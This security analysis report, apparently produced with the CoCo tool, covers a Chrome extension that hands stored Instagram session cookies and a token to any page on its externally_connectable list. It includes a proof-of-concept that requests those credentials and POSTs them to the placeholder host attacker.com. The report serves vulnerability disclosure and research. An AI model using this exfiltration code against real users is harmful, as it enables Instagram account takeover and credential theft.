# CoCo Analysis: cegddajdfabllncgnkadccjdkffbnolk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (duplicate detections of same flow)

---

## Sink: cookies_source → sendResponseExternal_sink

**CoCo Trace:**
No specific line numbers provided in CoCo trace. Flow detected from cookies_source to sendResponseExternal_sink.

**Code:**

```javascript
// Background script - External message listener
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
    switch (request.type) {
        case 'GET_VERSION':
            const version = chrome.runtime.getManifest().version
            sendResponse(version);
            break;
        case 'CHECK_INSTALLED':
            sendResponse(true);
            break;
        case 'CLEAN_TOKEN':
            var token = localStorage.getItem(LocalStorageKeys.InstagramToken);
            localStorage.setItem(LocalStorageKeys.InstagramToken, '');
            localStorage.setItem(LocalStorageKeys.InstagramRequest, '');
            localStorage.setItem(LocalStorageKeys.InstagramCookies, '');
            sendResponse(true);
            break;
        case 'GET_INSTAGRAM_COOKIES':
            var instagramCookies = getInstagramCookieFromLocalStorage(); // ← Retrieves stored cookies
            const hasValidCookieUserId = validateCookiesHasValidUserId();
            if (hasValidCookieUserId)
                sendResponse(instagramCookies); // ← Sends cookies back to external attacker
            else
                sendResponse(null);
            break;
        case 'GET_TOKEN':
            var token = localStorage.getItem(LocalStorageKeys.InstagramToken);
            sendResponse(token); // ← Leaks token to external attacker
            break;
        case 'CONFIG':
            requestManager.setConfig(request.configObj)
            break;
        default:
    };
});

function readCookiesAndUpdateStorage() {
    chrome.cookies.getAll({domain: "instagram.com"}, function (cookies) { // ← Reads Instagram cookies
        for (var i = 0; i < cookies.length; i++) {
            let cookieKey = cookies[i].name;
            let cookieValue = cookies[i].value;
            if (InstagramCookieManager.hasOwnProperty(cookieKey)) {
                InstagramCookieManager[cookieKey] = cookieValue;
            }
        }
        var dataToStore = JSON.stringify(InstagramCookieManager);
        localStorage.setItem(LocalStorageKeys.InstagramCookies, dataToStore); // ← Stores cookies
    });
}

function getInstagramCookieFromLocalStorage() {
    var cookies = localStorage.getItem(LocalStorageKeys.InstagramCookies);
    return cookies ? JSON.parse(cookies) : null;
}

// manifest.json externally_connectable
// "externally_connectable": {
//     "matches": ["*://localhost/*","*://*.loola.tv/*","*://m.facebook.com/*","*://*.instagram.com/*"]
// }
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From a malicious webpage matching externally_connectable pattern
// (e.g., attacker-controlled subdomain on *.loola.tv, or localhost during development)

// Request Instagram cookies
chrome.runtime.sendMessage('cegddajdfabllncgnkadccjdkffbnolk',
    { type: 'GET_INSTAGRAM_COOKIES' },
    function(cookies) {
        console.log('Stolen Instagram cookies:', cookies);
        // cookies contains: {rur, csrftoken, urlgen, ds_user_id, sessionid}
        // Send to attacker server
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(cookies)
        });
    }
);

// Also steal Instagram token
chrome.runtime.sendMessage('cegddajdfabllncgnkadccjdkffbnolk',
    { type: 'GET_TOKEN' },
    function(token) {
        console.log('Stolen Instagram token:', token);
        // Send to attacker server
        fetch('https://attacker.com/collect-token', {
            method: 'POST',
            body: JSON.stringify({token: token})
        });
    }
);
```

**Impact:** Sensitive data exfiltration. An external attacker from any website matching the externally_connectable whitelist (including *.loola.tv, localhost, m.facebook.com, *.instagram.com) can send messages to the extension and retrieve the user's Instagram session cookies (sessionid, csrftoken, ds_user_id, etc.) and Instagram authentication token. These credentials allow the attacker to impersonate the user on Instagram, access their private data, post on their behalf, and perform any action the user can perform. This is a complete account takeover vulnerability.
